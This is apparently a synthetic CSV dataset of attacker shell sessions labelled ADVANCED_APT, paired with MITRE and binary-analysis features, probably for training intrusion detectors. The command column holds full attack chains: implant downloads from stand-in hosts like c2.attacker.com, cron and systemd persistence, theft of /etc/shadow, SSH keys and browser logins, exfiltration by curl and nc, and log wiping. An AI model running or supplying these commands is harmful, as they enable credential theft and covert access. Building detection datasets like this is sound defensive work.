session_id,src_ip,num_commands,duration_sec,commands,label_id,label_name,mitre_tactic_reconnaissance,mitre_tactic_resource_development,mitre_tactic_initial_access,mitre_tactic_execution,mitre_tactic_persistence,mitre_tactic_privilege_escalation,mitre_tactic_defense_evasion,mitre_tactic_credential_access,mitre_tactic_discovery,mitre_tactic_lateral_movement,mitre_tactic_collection,mitre_tactic_command_and_control,mitre_tactic_exfiltration,mitre_tactic_impact,mitre_severity_max,mitre_severity_mean,mitre_severity_weighted,mitre_kill_chain_score,mitre_unique_technique_count,mitre_total_commands,mitre_matched_commands,triage_file_size,triage_entropy,triage_priority,triage_is_go,triage_is_packed,triage_is_stripped,triage_is_dll,triage_is_static,triage_score_mining,triage_score_botnet,triage_score_recon,triage_score_destructive,ghidra_function_count,ghidra_total_instructions,ghidra_total_basic_blocks,ghidra_max_function_size,ghidra_avg_callers,ghidra_max_callers,ghidra_mining_pool_count,ghidra_crypto_wallet_count,ghidra_ip_count,ghidra_url_count,ghidra_shell_cmd_count,ghidra_file_path_count,ghidra_imports_file_io,ghidra_imports_process,ghidra_imports_network,ghidra_imports_crypto,ghidra_imports_evasion,ghidra_has_aes_sbox,ghidra_has_sha256_constants,ghidra_has_rc4_state,ghidra_has_xor_loop,ghidra_go_user_functions,ghidra_go_runtime_functions,angr_basic_blocks,angr_edges,angr_functions_recovered,angr_cyclomatic_complexity,angr_function_count,angr_user_functions_listed,angr_syscalls_network,angr_syscalls_file_io,angr_syscalls_process,angr_syscalls_memory,angr_ip_count,angr_url_count,angr_mining_indicator_count,angr_shell_cmd_count,angr_has_network,angr_has_file_manipulation,angr_has_process_control,angr_has_crypto,angr_has_mining,angr_has_persistence,angr_has_evasion,angr_has_shell_execution,angr_complexity_tier,angr_is_partial,angr_loaded_as_blob,script_line_count,script_url_count,script_download_count,script_arch_count,script_is_downloader,script_is_multi_arch,script_is_miner,script_has_persistence,script_has_anti_forensics,has_ghidra_results,has_angr_results,has_script_results,deep_func_ratio_angr_ghidra,deep_mining_signal_count,deep_total_network_indicators,deep_total_crypto_indicators,deep_max_complexity,deep_total_evasion_indicators,deep_is_go_consensus,num_downloads,download_shas
synth_advanced_apt_812472,100.212.171.34,13,351.0741537367473,uname -a; id; netstat -tulpn; wget http://192.168.1.100/implant -O /tmp/.update; chmod +x /tmp/.cron; /tmp/.cron &; echo '* * * * * /tmp/.rsyslogd' >> /var/spool/cron/crontabs/root; cat /etc/shadow > /tmp/.c; cat ~/.ssh/id_rsa >> /tmp/.c; curl -X POST http://update.evil.net/exfil -d @/tmp/.c; rm /tmp/.c; history -c; chattr +i /tmp/.kworker,5,ADVANCED_APT,1.6224174076243731,0.7388399597974495,0.15163550040353602,2.0013092269195276,2.5717019715604765,3.9986910284855917,3.346117821964277,4.373859240236649,3.0068215126799354,1.630589696104564,3.9803340897294026,4.439943957525243,2.134489824060456,1.8809032631475888,8.243819124483831,7.918611816944259,7.728841668194734,10.911611170738693,17,26,23,17328480.6232099,5.269045463101321,97.5043350088961,1.0,0.0,1.0,0.0,0.0,0.2903804087092888,0.4752938858900021,0.0,0.0,3798.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0,11.0,0.0,0.0,0.0,0.0,0.0,83.0,623.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_311914,213.163.204.236,14,722.3989497136503,ps aux; netstat -antp; cat /proc/cpuinfo | head -5; cd /tmp; wget http://c2.attacker.com/kit.tar.gz; tar xzf kit.tar.gz; cd kit; ./install.sh; cat /etc/crontab; echo '0 */6 * * * /opt/.kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins' > /tmp/.browser; nc 192.168.1.100 443 < /tmp/.browser; rm -rf /tmp/kit* /tmp/.browser; history -c,5,ADVANCED_APT,2.4818812280394855,0.42412588451238686,0.2243857230941404,3.7524327280057133,4.091751312440648,1.0137498972467314,3.6296937233176862,2.830586708161258,4.468658207983378,1.8228557878302671,2.568941437506771,4.236198867350381,2.4840420876288265,1.274916607240986,9.906256087239772,7.691889584679924,8.232364627752215,10.25368208345953,12,16,9,12656435.946428934,5.260866488220101,83.95975879382104,1.0,0.0,1.0,0.0,0.0,0.39547528555538364,0.30808148290646875,0.0,0.0,2379.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0,13.0,0.0,0.0,0.0,0.0,0.0,162.0,1532.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_723357,24.77.113.11,11,1056.5590970918315,hostname; whoami; cat /etc/passwd | wc -l; curl -s http://c2.attacker.com/backdoor -o /tmp/.bd; chmod +x /tmp/.bd; nohup /tmp/.bd c2.attacker.com 443 &; cp /tmp/.bd /usr/bin/.sysupdate; echo '/usr/bin/.sysupdate &' >> ~/.bashrc; cat /etc/shadow | base64 | curl -X POST http://192.168.1.100/data -d @-; find /var/log -name '*.log' -exec cat /dev/null > {} \;,5,ADVANCED_APT,2.593208620286923,0.5817451439951871,0.6265071937635232,4.939665746143543,4.0879579276904785,1.6637078713222568,2.0072822313412106,4.087877892263995,2.982703634692918,2.2953739586477466,3.4943803458980334,3.77689641805319,3.0718448694537237,0.14634518909893912,8.968505538018627,7.199634371588281,7.944047974356406,7.245687193308404,15,25,18,14871836.518965472,6.25764486669143,71.81293753900833,1.0,0.0,1.0,0.0,0.0,0.34182916348232145,0.6142291336478423,0.0,0.0,1339.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,5.0,0.0,0.0,0.0,0.0,0.0,91.0,1183.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_186197,111.9.52.236,2,833.766978831184,"echo '[Unit]
Description=System Update
[Service]
ExecStart=/tmp/.systemd
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/.systemd.service; systemctl enable .cron.service",5,ADVANCED_APT,1.4404426100223273,0.2480022343471,0.8131265075427105,3.024472087562626,4.9805279997486505,3.654479845696951,3.7572330789442634,2.463805029707724,2.9623356609525486,1.2689425331776336,2.088471953168436,4.081083847904765,2.8786888897268366,0.35649117981829104,8.003291010306736,7.05314846275522,7.661204075073698,8.248976678866274,10,19,14,19664212.732826132,5.06131240611376,85.37014642739267,1.0,0.0,1.0,0.0,0.0,0.4966732664700673,0.7101309681012702,0.0,0.0,4269.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0,7.0,0.0,0.0,0.0,0.0,0.0,178.0,1753.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_941862,60.222.146.9,3,889.9589510297859,cat /etc/shadow > /tmp/.creds; cat ~/.ssh/id_rsa >> /tmp/.creds; cat ~/.bash_history >> /tmp/.creds,5,ADVANCED_APT,2.629881854917154,0.4318327350873986,0.12672925017463688,2.9925646723427715,4.541346732116983,1.606858382762347,3.79423325216581,4.693848387619188,4.293394546936842,2.7216559578399866,3.423131283936583,2.6846745126643796,2.9249735857764,0.48210314227944595,8.146672816326518,7.922212059211078,7.8164946666011685,10.26969076760875,15,12,17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_389033,63.91.182.39,1,862.2410911206114,echo '* * * * * /tmp/.systemd' >> /var/spool/cron/crontabs/root,5,ADVANCED_APT,2.3322701080706167,0.041518236795376695,0.4256089416293095,2.365215778559913,3.7654021779855444,1.5463021531394519,2.436782316241454,2.108503021087741,2.702022026496645,2.8063482162500613,2.791597304547472,2.0037228004433123,2.6641427471148464,0.4650535642649811,8.680245567781377,7.0303425930898396,8.658166341949567,8.974546203538988,14,17,22,11531104.325120907,5.507829888827938,89.25372574160625,1.0,0.0,1.0,0.0,0.0,0.4413467671561924,0.31634432329850126,0.0,0.0,1907.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,27.0,6.0,0.0,0.0,0.0,0.0,0.0,116.0,1006.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_862832,51.123.129.6,1,1134.9715159639145,ssh-keyscan 192.168.1.0/24 2>/dev/null > /tmp/.hosts,5,ADVANCED_APT,2.1148763377185618,0.07842266919212337,0.8836194208417325,3.8883822027457127,4.135597685872298,3.6605164468190616,3.0384008049879263,3.6414261605635403,2.506156671318438,2.767541771585921,3.867638312707575,3.6409900954187298,3.7260813557795913,1.6011361394744497,9.759728856849497,6.003362054468427,8.014730829857914,9.60798982097893,10,30,19,6294401.093684734,6.34431762185795,89.68800058381657,1.0,0.0,1.0,0.0,0.0,0.29564398824022575,0.4679085724686748,0.0,0.0,1180.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,27.0,8.0,0.0,0.0,0.0,0.0,0.0,116.0,663.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_961021,203.217.198.90,1,1111.7784406774886,curl -X POST http://c2.attacker.com/exfil -d @/tmp/.creds,5,ADVANCED_APT,2.0413199185949806,0.5465262754813146,0.7490927649182384,3.1202838162957276,2.200524262952938,3.386136536443275,2.266661000356738,2.2607463335141063,2.312923074212277,2.74232476635857,3.0373937346872957,4.829107437514826,3.46002045644249,1.3740377078930246,9.739667021730828,6.6161724601060055,8.380079219024582,9.547651612140402,9,22,25,13217246.977046808,5.121923769993175,91.87018499459835,1.0,0.0,1.0,0.0,0.0,0.22524915616235763,0.41102643984376286,0.0,0.0,2162.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0,8.0,0.0,0.0,0.0,0.0,0.0,63.0,1047.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_229099,191.36.225.161,3,17.370458474781408,for h in $(cat /tmp/.hosts); do scp /tmp/.sshd root@$h:/tmp/; done,5,ADVANCED_APT,2.041908281852649,0.9859084624516177,0.09548924540314252,3.687542853682318,3.4901481644165426,1.9650295550161954,4.21589265333849,2.5733960446858957,4.748099961932516,2.282175020298398,3.4284741265274867,2.647609363726622,3.8535397906763196,0.572815006746948,9.280075036909292,6.737276195243732,7.852773024779033,9.509152610141022,20,19,9,20391416.221076686,5.106739071736675,87.33094980732434,1.0,0.0,1.0,0.0,0.0,0.004759199280724047,0.6042443872405967,0.0,0.0,1239.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0,13.0,0.0,0.0,0.0,0.0,0.0,146.0,1204.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_788678,20.203.44.21,1,240.60137440524724,echo '* * * * * /tmp/.update' >> /var/spool/cron/crontabs/root,5,ADVANCED_APT,1.7681904376075828,0.39541998340966333,0.8891134321922467,3.377084401695566,3.476349843370466,1.2300847005073536,4.447574841172841,2.104825321872341,2.835548546735577,1.570197370539841,3.9426466778952443,2.513936052152123,2.425913277880376,1.1887364605328716,8.72781691660151,7.165591299861759,8.719885221417885,9.508929134083314,20,18,12,9176152.660644587,5.134287528113842,99.37000650217786,1.0,0.0,1.0,0.0,0.0,0.007970806659751473,0.4375945502843764,0.0,0.0,3112.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,29.0,15.0,0.0,0.0,0.0,0.0,0.0,77.0,857.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_131295,183.190.89.127,2,101.37873267423535,wget http://c2.attacker.com/implant -O /tmp/.kworker; chmod +x /tmp/.cron,5,ADVANCED_APT,1.5800865153396555,0.25388865624052537,0.3793750528183759,2.212017874975011,4.316594468069424,2.1127973812484893,2.684198842931645,2.70270480907649,4.534656950406089,1.3313392758973428,2.6356213036657703,2.5792703902225624,3.6406797195937957,0.05966301127454843,9.75378201686383,7.50305919529849,8.448274343711127,9.972874635990923,11,20,12,24255245.59920441,5.185812757076007,85.5891674927928,1.0,0.0,1.0,0.0,0.0,0.4029355041115042,0.5045496379557095,0.0,0.0,3614.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0,6.0,0.0,0.0,0.0,0.0,0.0,106.0,1395.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_267942,34.54.224.178,14,1060.8121035432064,ps aux; netstat -antp; cat /proc/cpuinfo | head -5; cd /tmp; wget http://10.10.10.10/kit.tar.gz; tar xzf kit.tar.gz; cd kit; ./install.sh; cat /etc/crontab; echo '0 */6 * * * /opt/.kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins' > /tmp/.browser; nc 192.168.1.100 4444 < /tmp/.browser; rm -rf /tmp/kit* /tmp/.browser; history -c,5,ADVANCED_APT,1.5931835962974348,0.8929162003072487,0.7511489766209118,4.352667276819093,2.962614669095998,1.5428460784026168,4.488271655719316,4.952829676934762,3.846004334078317,2.9772403466101993,3.7258970364111645,4.2972932663339405,2.1088539432327322,1.74201733511796,9.71120436104192,7.46525623830372,8.86493415189581,7.841955259602097,16,12,23,11608966.877487782,6.020302170538828,95.64801524921897,1.0,0.0,1.0,0.0,0.0,0.16421095376068012,0.6728191960145367,0.0,0.0,2665.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,29.0,6.0,0.0,0.0,0.0,0.0,0.0,196.0,1162.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_353664,75.100.90.226,2,184.63860583913208,wget http://update.evil.net/implant -O /tmp/.sshd; chmod +x /tmp/.rsyslogd,5,ADVANCED_APT,1.8022897489241827,0.2807783558406388,0.8132446422302705,3.236460200467207,3.3596074201818524,3.953450592805264,4.3677198883394235,2.465865899989962,3.235507403223185,1.0519520710167585,3.526174255639953,2.0022934856606938,3.7388518913930024,0.7197229774122931,9.023257922163962,7.7205941033239585,8.913148759925749,7.497921078497919,10,22,9,17686243.01614318,6.446449710243461,87.46646631592816,1.0,0.0,1.0,0.0,0.0,0.08520899354133327,0.4718804768651269,0.0,0.0,3453.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0,15.0,0.0,0.0,0.0,0.0,0.0,176.0,917.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_174979,125.186.70.198,2,225.83748210998172,shred -u /var/log/auth.log; cat /dev/null > ~/.bash_history,5,ADVANCED_APT,2.533878112449293,0.7495813965601654,0.87381989249025,2.8273317395135087,2.6576227963121086,2.008695484830624,3.334499446126753,4.5022720094042,2.0203481238945398,1.3497385548594525,3.0948786565105153,4.882736713641725,3.216774210638653,1.9089753836056047,9.179377607126678,6.659053000312904,8.9764002258044,7.901920653200297,18,10,23,25826820.14723932,5.103123289507031,84.16787299159472,1.0,0.0,1.0,0.0,0.0,0.31297019326085895,0.6665418555419453,0.0,0.0,1485.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,15.0,0.0,0.0,0.0,0.0,0.0,134.0,1700.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_819483,125.215.214.101,14,1067.8428297411158,ps aux; netstat -antp; cat /proc/cpuinfo | head -5; cd /tmp; wget http://10.10.10.10/kit.tar.gz; tar xzf kit.tar.gz; cd kit; ./install.sh; cat /etc/crontab; echo '0 */6 * * * /opt/.kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins' > /tmp/.browser; nc update.evil.net 1337 < /tmp/.browser; rm -rf /tmp/kit* /tmp/.browser; history -c,5,ADVANCED_APT,1.980041579149868,0.0009952974031822714,0.712326160120981,2.282913683599803,2.1562607310692803,2.2961369106779164,2.4091130906732503,2.4721489633406657,4.851227448352878,2.4046027109162353,2.3867838215116572,3.2430014707984167,3.3751575022093627,0.1985035147918648,8.759989707374977,6.28740338114712,8.608981501386078,10.515791871650542,17,25,18,11978147.870508254,6.174768267000332,73.54836928566456,1.0,0.0,1.0,0.0,0.0,0.12899879990996965,0.5267949635164069,0.0,0.0,2232.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0,13.0,0.0,0.0,0.0,0.0,0.0,137.0,1916.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_536407,107.231.109.152,13,460.47533209691113,uname -a; id; netstat -tulpn; wget http://update.evil.net/implant -O /tmp/.sshd; chmod +x /tmp/.rsyslogd; /tmp/.sshd &; echo '* * * * * /tmp/.rsyslogd' >> /var/spool/cron/crontabs/root; cat /etc/shadow > /tmp/.c; cat ~/.ssh/id_rsa >> /tmp/.c; curl -X POST http://10.10.10.10/exfil -d @/tmp/.c; rm /tmp/.c; history -c; chattr +i /tmp/.systemd,5,ADVANCED_APT,1.485270037445467,0.654892367649189,0.2664469830957358,2.7015781701028256,3.0987793426515475,3.681295830016466,3.288534133982697,3.6354021797202694,3.1561632221633023,2.1593999390198197,3.0744084252807253,4.181233739824881,2.3981664992729375,0.6238380526112719,8.54814066758455,7.346859326312178,7.158791153655839,7.467052309717408,8,29,11,8946111.65621354,6.092814380073079,75.55344577415872,1.0,0.0,1.0,0.0,0.0,0.3076959391275491,0.39987310502341566,0.0,0.0,3522.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,21.0,13.0,0.0,0.0,0.0,0.0,0.0,132.0,984.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_450185,30.215.129.198,3,1075.714694460532,hostname; ifconfig; netstat -tulpn | head -10,5,ADVANCED_APT,2.892635392834315,0.6948042927165577,0.7530515172164773,2.6282144275609216,3.665101716703151,2.293413072627298,2.803093523515712,3.960040270352473,4.708715311783346,1.9407502178044629,2.720159408530143,2.3409013684030375,2.154501188290655,0.9779621437002406,8.487860832269511,7.327866796091875,7.548863725245301,8.132342277304096,9,21,22,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_562167,190.197.194.171,2,974.1734981875942,wget http://c2.attacker.com/implant -O /tmp/.rsyslogd; chmod +x /tmp/.kworker,5,ADVANCED_APT,1.4854667835367295,0.13499307413214423,0.682858356339852,3.040870548340664,4.00941410314116,3.7466411794086873,4.1037986151506916,3.1425743302882365,4.326217227340991,2.5720432560268427,2.1301038579334053,3.7402166538482304,3.2475601933961444,1.7506551062253624,9.38405389768558,6.721546425160001,8.559423796613512,8.378415415779227,19,19,22,25042909.168834165,5.617452907410916,93.4517043424823,1.0,0.0,1.0,0.0,0.0,0.06766807368261873,0.4150487062294702,0.0,0.0,4533.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0,12.0,0.0,0.0,0.0,0.0,0.0,165.0,975.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_546399,57.142.182.94,3,842.598219632036,rm -f /tmp/.creds; history -c; unset HISTFILE,5,ADVANCED_APT,2.9024999953531223,0.8103528226917597,0.07963891838143244,4.619474000110813,2.2074377068052535,2.3582709679642617,2.7224887620793785,4.159505264017641,4.555412928188443,2.9565165297760503,2.4772886119931927,4.773346284870831,3.91612550068119,1.5225239964113346,9.69372735899242,7.786234433253735,7.086676733699869,9.039568680971328,12,19,15,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_643761,142.210.4.232,3,240.9566755146237,rm -f /tmp/.creds; history -c; unset HISTFILE,5,ADVANCED_APT,2.0600377578999804,0.5478022401790207,0.9928455324415919,2.1334797388794056,2.9157932895350713,1.7946681766900525,3.8135444373398215,2.5862144200357777,4.6591610885900065,1.9448003696514633,2.9832191666335106,4.094667708800468,3.9477681257316375,0.5073661241713556,8.158055519003549,7.863900806608724,7.826190467662893,8.603520472824936,14,20,12,10484507.830645302,6.258401711959944,91.32602769338466,1.0,0.0,1.0,0.0,0.0,0.0007389077752796291,0.5052189363050256,0.0,0.0,2931.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0,12.0,0.0,0.0,0.0,0.0,0.0,168.0,543.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
